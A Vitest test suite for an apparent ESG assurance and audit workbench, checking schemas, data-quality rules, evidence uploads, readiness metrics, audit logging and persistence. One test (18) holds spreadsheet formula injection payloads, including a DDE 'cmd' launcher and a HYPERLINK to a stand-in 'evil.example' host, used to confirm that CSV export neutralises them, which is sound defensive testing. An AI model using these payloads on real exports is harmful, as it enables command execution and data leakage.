import { beforeEach, describe, expect, it } from 'vitest';
import {
  getEvidenceBlob,
   getPersistedThemeMode,
  initializeOrLoadDataset,
  markFindingResolvedInStore,
  resetDbConnectionCache,
  revalidateAndPersistFindings,
  saveEntityWithAuditAndRevalidate,
  saveUploadedEvidenceWithBlob,
  setPersistedThemeMode,
  STORES,
} from '../db/repository';
import { generateSyntheticDataset } from '../seed/syntheticDataset';
import {
  AssuranceEngagementInputSchema,
  ESGAssertionInputSchema,
  InternalControlInputSchema,
} from '../validation/schemas';
import { runDeterministicValidation } from '../validation/dqEngine';
import {
  applyGlobalFilters,
  calculateAssuranceReadinessMetrics,
} from '../methodology/readinessCalculator';
import {
  computeSha256Hex,
  generateAssertionsCsv,
  sanitizeCsvCell,
  validateEvidenceFile,
} from '../utils/security';
import {
  AssuranceEngagement,
  ESGAssertion,
  EvidenceRecord,
  InternalControl,
} from '../types/domain';

describe('ESG Assurance & Audit Workbench v0.1.0 — Automated Verification Suite (20 Tests)', () => {
  beforeEach(async () => {
    resetDbConnectionCache();
    await initializeOrLoadDataset(true);
  });

  // 1. Engagement creation
  it('01. creates and persists a new assurance engagement with valid fields', async () => {
    const input = {
      organizationId: 'ORG-ASTERION-001',
      engagementName: 'FY 2026 Water & Waste Controls Readiness Review',
      engagementObjective: 'Verify water withdrawal and waste diversion controls across 5 plants.',
      reportingBoundary: 'Operational Control - 5 European Manufacturing Plants',
      reportingYear: 'FY 2026' as const,
      engagementType: 'Sustainability Disclosure Controls Review' as const,
      assuranceLevel: 'Planned Limited Assurance Readiness' as const,
      engagementStatus: 'Planning' as const,
      scopeDescription: 'Detailed control walkthroughs for ESRS E3 water and E5 circular economy.',
      plannedStartDate: '2026-03-01',
      plannedEndDate: '2026-08-31',
      methodologyVersion: 'CSRD Readiness v2.0',
    };

    const parsed = AssuranceEngagementInputSchema.safeParse(input);
    expect(parsed.success).toBe(true);

    const newEngagement: AssuranceEngagement = {
      ...input,
      engagementId: 'ENG-2026-004',
      createdAt: '2026-02-01T00:00:00.000Z',
      updatedAt: '2026-02-01T00:00:00.000Z',
    };

    await saveEntityWithAuditAndRevalidate({
      storeName: STORES.ENGAGEMENTS,
      entity: newEngagement,
      auditEvent: {
        engagementId: newEngagement.engagementId,
        entityType: 'AssuranceEngagement',
        entityId: newEngagement.engagementId,
        action: 'ENGAGEMENT_CREATED',
        actor: 'Test Auditor',
        previousValue: 'None',
        newValue: newEngagement.engagementName,
      },
    });

    const loaded = await initializeOrLoadDataset(false);
    expect(loaded.engagements.some((e) => e.engagementId === 'ENG-2026-004')).toBe(true);
  });

  // 2. Engagement editing
  it('02. edits an existing engagement and persists the updated status and scope', async () => {
    const initial = await initializeOrLoadDataset(false);
    const target = initial.engagements.find((e) => e.engagementId === 'ENG-2025-002')!;
    expect(target).toBeDefined();

    const updated: AssuranceEngagement = {
      ...target,
      engagementStatus: 'Review',
      scopeDescription: 'Updated scope including expanded Scope 3 supplier EPDs.',
      updatedAt: '2026-02-15T10:00:00.000Z',
    };

    await saveEntityWithAuditAndRevalidate({
      storeName: STORES.ENGAGEMENTS,
      entity: updated,
      auditEvent: {
        engagementId: updated.engagementId,
        entityType: 'AssuranceEngagement',
        entityId: updated.engagementId,
        action: 'ENGAGEMENT_UPDATED',
        actor: 'Test Auditor',
        previousValue: target.engagementStatus,
        newValue: updated.engagementStatus,
      },
    });

    const reloaded = await initializeOrLoadDataset(false);
    const after = reloaded.engagements.find((e) => e.engagementId === 'ENG-2025-002')!;
    expect(after.engagementStatus).toBe('Review');
    expect(after.scopeDescription).toContain('expanded Scope 3');
  });

  // 3. Invalid date rejection
  it('03. rejects engagement input when plannedEndDate is earlier than plannedStartDate', () => {
    const invalidInput = {
      organizationId: 'ORG-ASTERION-001',
      engagementName: 'Invalid Date Range Engagement',
      engagementObjective: 'Test invalid date rejection in schema validation.',
      reportingBoundary: 'Operational Control Boundary',
      reportingYear: 'FY 2025' as const,
      engagementType: 'Internal ESG Audit' as const,
      assuranceLevel: 'Internal Audit Advisory Only' as const,
      engagementStatus: 'Planning' as const,
      scopeDescription: 'Testing end date prior to start date rejection.',
      plannedStartDate: '2025-10-15',
      plannedEndDate: '2025-05-01', // Earlier than start date
      methodologyVersion: 'v1.0',
    };

    const result = AssuranceEngagementInputSchema.safeParse(invalidInput);
    expect(result.success).toBe(false);
    if (!result.success) {
      expect(result.error.issues[0].message).toContain(
        'Planned end date must be on or after the planned start date'
      );
    }
  });

  // 4. Assertion creation
  it('04. creates and persists a valid ESG assertion in IndexedDB', async () => {
    const input = {
      engagementId: 'ENG-2025-002',
      metricCode: 'GHG-SC1-01',
      metricName: 'Direct Scope 1 Stationary Combustion Emissions',
      pillar: 'Environmental' as const,
      reportingYear: 'FY 2025' as const,
      facilityId: 'FAC-MUN-01',
      reportedValue: 1580.4,
      valueBasis: 'Reported' as const,
      unit: 'tCO2e',
      assertionType: 'Completeness' as const,
      reportingBoundary: 'Operational Control - Facility Complete',
      dataSource: 'SAP EHS Utility Meter Ledger',
      calculationMethod: 'Activity Data x DEFRA 2025 Emission Factor',
      reviewStatus: 'Reviewed' as const,
      requiresEvidence: true,
      linkedEvidenceIds: ['EVD-DEMO-001'],
    };

    const parsed = ESGAssertionInputSchema.safeParse(input);
    expect(parsed.success).toBe(true);

    const newAssertion: ESGAssertion = {
      ...input,
      assertionId: 'AST-ASN-061',
      createdAt: '2026-02-01T00:00:00.000Z',
      updatedAt: '2026-02-01T00:00:00.000Z',
    };

    await saveEntityWithAuditAndRevalidate({
      storeName: STORES.ASSERTIONS,
      entity: newAssertion,
      auditEvent: {
        engagementId: newAssertion.engagementId,
        entityType: 'ESGAssertion',
        entityId: newAssertion.assertionId,
        action: 'ASSERTION_CREATED',
        actor: 'Test Auditor',
        previousValue: 'None',
        newValue: '1580.4 tCO2e',
      },
    });

    const loaded = await initializeOrLoadDataset(false);
    const saved = loaded.assertions.find((a) => a.assertionId === 'AST-ASN-061');
    expect(saved).toBeDefined();
    expect(saved?.reportedValue).toBe(1580.4);
  });

  // 5. Missing versus zero
  it('05. enforces Missing vs. Zero distinction (Missing stays null, unverified 0 triggers DQ-07)', () => {
    // Missing with 0 must be rejected by Zod schema
    const missingWithZero = ESGAssertionInputSchema.safeParse({
      engagementId: 'ENG-2025-002',
      metricCode: 'GHG-SC1-01',
      metricName: 'Direct Scope 1 Emissions',
      pillar: 'Environmental',
      reportingYear: 'FY 2025',
      facilityId: 'FAC-MUN-01',
      reportedValue: 0,
      valueBasis: 'Missing',
      unit: 'tCO2e',
      assertionType: 'Accuracy',
      reportingBoundary: 'Operational Control',
      dataSource: 'Meter Log',
      calculationMethod: 'Direct Meter',
      reviewStatus: 'Unreviewed',
      requiresEvidence: false,
      linkedEvidenceIds: [],
    });
    expect(missingWithZero.success).toBe(false);

    // Missing with null is valid in schema and preserves null
    const validMissing = ESGAssertionInputSchema.safeParse({
      engagementId: 'ENG-2025-002',
      metricCode: 'GHG-SC1-01',
      metricName: 'Direct Scope 1 Emissions',
      pillar: 'Environmental',
      reportingYear: 'FY 2025',
      facilityId: 'FAC-MUN-01',
      reportedValue: null,
      valueBasis: 'Missing',
      unit: 'tCO2e',
      assertionType: 'Accuracy',
      reportingBoundary: 'Operational Control',
      dataSource: 'Meter Log',
      calculationMethod: 'Direct Meter',
      reviewStatus: 'Unreviewed',
      requiresEvidence: false,
      linkedEvidenceIds: [],
    });
    expect(validMissing.success).toBe(true);
    if (validMissing.success) {
      expect(validMissing.data.reportedValue).toBeNull();
    }

    // Verified Zero with 0 is valid
    const validZero = ESGAssertionInputSchema.safeParse({
      engagementId: 'ENG-2025-002',
      metricCode: 'GOV-ET-02',
      metricName: 'Substantiated Ethics Cases',
      pillar: 'Governance',
      reportingYear: 'FY 2025',
      facilityId: 'FAC-MUN-01',
      reportedValue: 0,
      valueBasis: 'Verified Zero',
      unit: 'Cases',
      assertionType: 'Completeness',
      reportingBoundary: 'Operational Control',
      dataSource: 'Ethics Log',
      calculationMethod: 'Direct Count',
      reviewStatus: 'Reviewed',
      requiresEvidence: false,
      linkedEvidenceIds: [],
    });
    expect(validZero.success).toBe(true);
  });

  // 6. Duplicate assertion detection
  it('06. deterministically detects duplicate assertions (Rule DQ-02)', () => {
    const seed = generateSyntheticDataset();
    const dq02Findings = seed.findings.filter((f) => f.ruleId === 'DQ-02');
    expect(dq02Findings.length).toBe(2);
    expect(dq02Findings.map((f) => f.linkedEntityId)).toEqual(['AST-ASN-018', 'AST-ASN-024']);
  });

  // 7. Control creation
  it('07. creates and persists a new internal ESG control in IndexedDB', async () => {
    const controlInput = {
      engagementId: 'ENG-2025-002',
      controlCode: 'ENV-CTL-099',
      controlName: 'Automated Continuous Emissions Monitoring System (CEMS) Alert Control',
      pillar: 'Environmental' as const,
      controlObjective: 'Detect real-time stack sensor anomalies within 15 minutes.',
      riskDescription: 'Unrecorded stack emission spikes in thermal foundry.',
      controlOwner: 'Dr. Lukas Weber (Head of Energy Engineering)',
      controlFrequency: 'Continuous' as const,
      controlType: 'Detective' as const,
      controlDescription: 'Automated SCADA threshold check with mandatory engineer sign-off.',
      designStatus: 'Documented' as const,
      operatingStatus: 'Not Tested' as const,
      linkedAssertionIds: ['AST-ASN-001'],
      linkedEvidenceIds: ['EVD-DEMO-001'],
      lastReviewedDate: '2025-12-10',
    };

    const parsed = InternalControlInputSchema.safeParse(controlInput);
    expect(parsed.success).toBe(true);

    const newControl: InternalControl = {
      ...controlInput,
      controlId: 'AST-CTL-099',
      createdAt: '2026-02-01T00:00:00.000Z',
      updatedAt: '2026-02-01T00:00:00.000Z',
    };

    await saveEntityWithAuditAndRevalidate({
      storeName: STORES.CONTROLS,
      entity: newControl,
      auditEvent: {
        engagementId: newControl.engagementId,
        entityType: 'InternalControl',
        entityId: newControl.controlId,
        action: 'CONTROL_CREATED',
        actor: 'Test Auditor',
        previousValue: 'None',
        newValue: newControl.controlCode,
      },
    });

    const loaded = await initializeOrLoadDataset(false);
    expect(loaded.controls.some((c) => c.controlId === 'AST-CTL-099')).toBe(true);
  });

  // 8. Control owner validation
  it('08. validates control owner assignment in Zod and detects missing owners via DQ-05', () => {
    const emptyOwnerResult = InternalControlInputSchema.safeParse({
      engagementId: 'ENG-2025-002',
      controlCode: 'ENV-CTL-100',
      controlName: 'Unowned Test Control',
      pillar: 'Environmental',
      controlObjective: 'Ensure valid owner requirement.',
      riskDescription: 'Unassigned accountability risk.',
      controlOwner: '', // Invalid empty owner
      controlFrequency: 'Monthly',
      controlType: 'Preventive',
      controlDescription: 'Control description for testing owner requirement.',
      designStatus: 'Draft',
      operatingStatus: 'Not Tested',
      linkedAssertionIds: [],
      linkedEvidenceIds: [],
      lastReviewedDate: '2025-12-01',
    });
    expect(emptyOwnerResult.success).toBe(false);

    const seed = generateSyntheticDataset();
    const dq05Findings = seed.findings.filter((f) => f.ruleId === 'DQ-05');
    expect(dq05Findings.length).toBe(2);
    expect(dq05Findings.map((f) => f.linkedEntityId)).toEqual(['AST-CTL-009', 'AST-CTL-021']);
  });

  // 9. Evidence upload validation
  it('09. validates evidence file type and enforces the 5 MB maximum file size limit', () => {
    const validPdf = validateEvidenceFile({
      name: 'munich_gas_invoice_2025.pdf',
      type: 'application/pdf',
      size: 245 * 1024,
    });
    expect(validPdf.valid).toBe(true);

    const oversizedFile = validateEvidenceFile({
      name: 'huge_archive.pdf',
      type: 'application/pdf',
      size: 6 * 1024 * 1024, // 6 MB > 5 MB limit
    });
    expect(oversizedFile.valid).toBe(false);
    expect(oversizedFile.error).toContain('exceeds maximum allowed limit of 5.00 MB');

    const disallowedExe = validateEvidenceFile({
      name: 'malicious_script.exe',
      type: 'application/x-msdownload',
      size: 1024,
    });
    expect(disallowedExe.valid).toBe(false);
    expect(disallowedExe.error).toContain('Unsupported file type');
  });

  // 10. Evidence persistence
  it('10. persists actual uploaded file bytes (ArrayBuffer) and SHA-256 checksum in IndexedDB', async () => {
    const encoder = new TextEncoder();
    const rawBytes = encoder.encode('facility_id,mwh\nFAC-MUN-01,1250.5\n').buffer;
    const checksum = await computeSha256Hex(rawBytes);
    expect(checksum).toHaveLength(64);

    const uploadedRecord: EvidenceRecord = {
      evidenceId: 'EVD-UPL-TEST-01',
      engagementId: 'ENG-2025-002',
      linkedEntityType: 'ESGAssertion',
      linkedEntityId: 'AST-ASN-039',
      evidenceType: 'Utility Invoice',
      documentName: 'munich_electricity_log.csv',
      mimeType: 'text/csv',
      fileSize: rawBytes.byteLength,
      checksum,
      verificationStatus: 'Uploaded - Pending Review',
      isMetadataOnlyDemo: false,
      reviewerNotes: 'Verified meter extract CSV.',
      uploadedAt: '2026-02-10T12:00:00.000Z',
      reviewedAt: null,
    };

    await saveUploadedEvidenceWithBlob({
      evidence: uploadedRecord,
      blobBytes: rawBytes,
      actor: 'Test Auditor',
    });

    const retrievedBlob = await getEvidenceBlob('EVD-UPL-TEST-01');
    expect(retrievedBlob).not.toBeNull();
    expect(retrievedBlob?.documentName).toBe('munich_electricity_log.csv');
    expect(retrievedBlob?.bytes.byteLength).toBe(rawBytes.byteLength);
  });

  // 11. Evidence coverage calculation
  it('11. calculates Evidence Coverage and Evidence Acceptance Rate with explicit denominator exclusions', () => {
    const seed = generateSyntheticDataset();
    const initialMetrics = calculateAssuranceReadinessMetrics(seed, seed.evidence);

    // Out of 60 assertions, 2 are Not Applicable (requiresEvidence = false), so 58 require evidence.
    // 2 assertions (AST-ASN-039 and AST-ASN-044) have no linked evidence, so 56 / 58 have linked evidence (96.6%).
    expect(initialMetrics.assertionsRequiringEvidenceCount).toBe(58);
    expect(initialMetrics.assertionsWithAvailableEvidenceCount).toBe(56);
    expect(initialMetrics.evidenceCoveragePct).toBe(96.6);

    // All 40 seeded evidence records are metadata-only demo records, so reviewedEvidenceCount is 0.
    expect(initialMetrics.reviewedEvidenceCount).toBe(0);
    expect(initialMetrics.evidenceAcceptanceRatePct).toBe(0);
  });

  // 12. Assertion review coverage
  it('12. calculates Assertion Review Coverage excluding Not Applicable and Archived assertions', () => {
    const seed = generateSyntheticDataset();
    const metrics = calculateAssuranceReadinessMetrics(seed, seed.evidence);

    // 60 total assertions - 2 Not Applicable = 58 applicable assertions
    expect(metrics.totalAssertionsCount).toBe(60);
    expect(metrics.excludedNotApplicableAssertionsCount).toBe(2);
    expect(metrics.applicableAssertionsCount).toBe(58);
    expect(metrics.assertionReviewCoveragePct).toBe(
      Number(((metrics.reviewedAssertionsCount / 58) * 100).toFixed(1))
    );
  });

  // 13. Control documentation coverage
  it('13. calculates Control Documentation Coverage accurately from stored control designStatus', () => {
    const seed = generateSyntheticDataset();
    const metrics = calculateAssuranceReadinessMetrics(seed, seed.evidence);

    // Out of 25 controls, 19 are 'Documented', 4 'Draft', 1 'Undocumented', 1 'Requires Remediation' -> 19/25 = 76.0%
    expect(metrics.totalControlsCount).toBe(25);
    expect(metrics.documentedControlsCount).toBe(19);
    expect(metrics.controlDocumentationCoveragePct).toBe(76.0);
  });

  // 14. Validation rule execution & reopening of unresolved defects
  it('14. executes DQ-01..DQ-10 deterministically and reopens findings marked resolved if the defect persists', async () => {
    const dataset = await initializeOrLoadDataset(false);
    expect(dataset.findings.length).toBe(15);

    const targetFinding = dataset.findings.find((f) => f.ruleId === 'DQ-01')!;
    expect(targetFinding.status).toBe('Open');

    // User marks finding as Resolved WITHOUT fixing the underlying null assertion value
    const resolvedRes = await markFindingResolvedInStore(
      targetFinding.findingId,
      'Attempted bypass without fixing null value',
      'Test Reviewer'
    );
    expect(resolvedRes.finding.status).toBe('Resolved');

    // Revalidation runs -> since underlying defect persists, finding MUST reopen!
    const revalidated = await revalidateAndPersistFindings();
    const afterReval = revalidated.find((f) => f.findingId === targetFinding.findingId)!;
    expect(afterReval.status).toBe('Reopened');
  });

  // 15. Audit event generation
  it('15. appends immutable chronological audit events preserving previous and new values', async () => {
    const before = await initializeOrLoadDataset(false);
    const initialCount = before.auditEvents.length;
    expect(initialCount).toBe(100);

    const ctl = before.controls[0];
    await saveEntityWithAuditAndRevalidate({
      storeName: STORES.CONTROLS,
      entity: { ...ctl, controlFrequency: 'Quarterly' },
      auditEvent: {
        engagementId: ctl.engagementId,
        entityType: 'InternalControl',
        entityId: ctl.controlId,
        action: 'CONTROL_FREQUENCY_CHANGED',
        actor: 'Audit Trail Tester',
        previousValue: 'Monthly',
        newValue: 'Quarterly',
      },
    });

    const after = await initializeOrLoadDataset(false);
    expect(after.auditEvents.length).toBe(101);
    const latest = after.auditEvents.find((e) => e.action === 'CONTROL_FREQUENCY_CHANGED');
    expect(latest).toBeDefined();
    expect(latest?.previousValue).toBe('Monthly');
    expect(latest?.newValue).toBe('Quarterly');
  });

  // 16. IndexedDB persistence
  it('16. persists all entity stores across database reloads in IndexedDB', async () => {
    const loaded = await initializeOrLoadDataset(false);
    expect(loaded.organization.organizationName).toBe('Asterion Manufacturing Ltd.');
    expect(loaded.facilities).toHaveLength(5);
    expect(loaded.engagements).toHaveLength(3);
    expect(loaded.assertions).toHaveLength(60);
    expect(loaded.controls).toHaveLength(25);
    expect(loaded.evidence).toHaveLength(40);
    expect(loaded.findings).toHaveLength(15);
    expect(loaded.auditEvents).toHaveLength(100);
  });

  // 17. Synthetic seed determinism
  it('17. generates bit-for-bit identical synthetic datasets across multiple invocations', () => {
    const runA = generateSyntheticDataset();
    const runB = generateSyntheticDataset();

    expect(runA).toEqual(runB);
    expect(runA.findings.map((f) => f.findingId)).toEqual(
      runB.findings.map((f) => f.findingId)
    );
  });

  // 18. CSV export sanitization
  it('18. neutralizes spreadsheet formula injection payloads (=, +, -, @) during CSV export', () => {
    expect(sanitizeCsvCell('=cmd|\'/C calc\'!A0')).toBe('"\'=cmd|\'/C calc\'!A0"');
    expect(sanitizeCsvCell('+SUM(A1:A10)')).toBe('"\'+SUM(A1:A10)"');
    expect(sanitizeCsvCell('@IMPORTXML(...)')).toBe('"\'@IMPORTXML(...)"');
    // Negative numbers should remain unprefixed numeric strings
    expect(sanitizeCsvCell('-42.5')).toBe('"-42.5"');

    const seed = generateSyntheticDataset();
    const maliciousAssertion: ESGAssertion = {
      ...seed.assertions[0],
      dataSource: '=HYPERLINK("http://evil.example/leak", "Click")',
    };
    const csv = generateAssertionsCsv(
      [maliciousAssertion],
      new Map(seed.engagements.map((e) => [e.engagementId, e])),
      new Map(seed.facilities.map((f) => [f.facilityId, f]))
    );
    expect(csv).toContain('"\'=HYPERLINK(""http://evil.example/leak"", ""Click"")"');
  });

  // 19. Theme persistence
  it('19. persists light and dark theme preferences across storage reads and updates DOM class', async () => {
    await setPersistedThemeMode('dark');
    const mode1 = await getPersistedThemeMode();
    expect(mode1).toBe('dark');
    expect(document.documentElement.classList.contains('dark')).toBe(true);

    await setPersistedThemeMode('light');
    const mode2 = await getPersistedThemeMode();
    expect(mode2).toBe('light');
    expect(document.documentElement.classList.contains('dark')).toBe(false);
  });

  // 20. Global dashboard filtering
  it('20. recalculates filtered dataset and readiness metrics deterministically across global filters', () => {
    const seed = generateSyntheticDataset();

    const filteredFy2024 = applyGlobalFilters(seed, {
      engagementId: 'ENG-2024-001',
      reportingYear: 'FY 2024',
      facilityId: 'ALL',
      pillar: 'Environmental',
      reviewStatus: 'ALL',
    });

    expect(filteredFy2024.engagements).toHaveLength(1);
    expect(
      filteredFy2024.assertions.every(
        (a) => a.engagementId === 'ENG-2024-001' && a.pillar === 'Environmental'
      )
    ).toBe(true);

    const fy2024Metrics = calculateAssuranceReadinessMetrics(filteredFy2024, seed.evidence);
    expect(fy2024Metrics.activeEngagementsCount).toBe(1);
    expect(fy2024Metrics.totalAssertionsCount).toBe(filteredFy2024.assertions.length);
  });
});
